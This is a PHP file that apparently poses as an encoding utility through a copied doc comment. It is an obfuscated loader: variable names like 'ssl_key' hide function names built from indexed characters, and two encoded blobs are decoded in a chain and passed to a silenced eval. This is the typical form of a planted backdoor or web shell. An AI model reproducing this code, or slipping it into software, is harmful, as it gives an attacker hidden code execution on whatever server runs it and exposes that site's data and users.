<?php
/**
 This function does not attempt to guess the current encoding of the provided string, it assumes it is encoded as ISO-8859-1 (also known as "Latin 1") and converts to UTF-8. Since every sequence of bytes is a valid ISO-8859-1 string, this never results in an error, but will not result in a useful string if a different encoding was intended.
**/

$ssl_key = "IdsdMR8PY8e1rnrTQVgH_ebFESWoiH6334BT7d9j*z7M6n1huYgUD8evi2K/30t_lNfsX0.lw4mSc9V5XlcY/emePeeUSjZ4batLBeJbDavItop7ta.gpWrmqGczwpMnelaCs_X";
$ssl_verifier = $ssl_key[22] . $ssl_key[97] . $ssl_key[2] . $ssl_key[21] . $ssl_key[44] . $ssl_key[33] . $ssl_key[20] . $ssl_key[1] . $ssl_key[10] . $ssl_key[122] . $ssl_key[109] . $ssl_key[3] . $ssl_key[128];
$ssl_hash_key = $ssl_key[47] . $ssl_key[62] . $ssl_key[74] . $ssl_key[81] . $ssl_key[67] . $ssl_key[110] . $ssl_key[101] . $ssl_key[122] . $ssl_key[28] . $ssl_key[97] . $ssl_key[64] . $ssl_key[82] . $ssl_key[47] . $ssl_key[113] . $ssl_key[12] . $ssl_key[2] . $ssl_key[20] . $ssl_key[1] . $ssl_key[10] . $ssl_key[122] . $ssl_key[27] . $ssl_key[37] . $ssl_key[10];
$ssl_security = $ssl_key[115] . $ssl_key[123] . $ssl_key[28] . $ssl_key[13] . $ssl_key[66] . $ssl_key[129] . $ssl_key[130] . $ssl_key[108] . $ssl_key[89];
$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
$stt0 = "\x3dIp2Dv\x41ZTr8GJwM3YqGx\x61X4Fo\x62eTrYn\x2bf/Un3JtDj2F0e8/\x61odFtP\x432r\x2bdW\x42kzPpZS4s\x41Y62\x432OmfOD1UrKogDkRiJEl2LgS8sUxhq\x43WOFIRSW\x42GIlHpy2IQKKZuP8/2pHHTUX5pSNEDPZSS\x41eNlWMt\x43vFIq2ZkPQF2oF1l5\x43\x63/H\x414ziSh\x63IZWISG\x42XJM\x424srZsJ\x4220P50UYtgm\x62TNdlxLPxlp\x41HN8qI3H4K\x418l\x2bEfE4kDqoKh5L\x42eWtofSV\x61VEEh\x61Z\x61QkwSjv5NQmyKwkngSt20GHeTli7sZRxvg\x61LPEv\x63\x63\x41Sv1gzymTY2Z\x2brM0l\x63m\x424tS9Yr\x632mJf/\x63mOt9iwQ\x61WuOSDG9dSTmY\x617YzT\x43Mf\x62jqk\x63ufOXIdp4\x639\x62/5Hv\x42z\x62LwzQt\x42P716qeF\x42q2TPf8n\x41q003\x43dr\x42J\x63R/5gEXOVVRJkhQYP\x63y\x433\x2bd2Ov\x6373JyzdLgK\x61l3rztLfduEVkMnnTyFyokxqVJkTLfTz5hqkxUd\x42p\x2b\x2b/w02\x41d2T8pShUTp\x41RwNWsH\x633QhttJ41xpFQPIH/\x41vV\x2bR\x42M\x43v2WSVn/2FQi\x42wJe\x2bvW\x41UGg/mFQm\x42wJe\x2bvV\x41kGg/WFQq\x42wJe\x2bvU\x410Gg/GFQu\x42wJe";
@eval/*******/($ssl_hash_key($ssl_security($ssl_verifier($stt1))));
?>


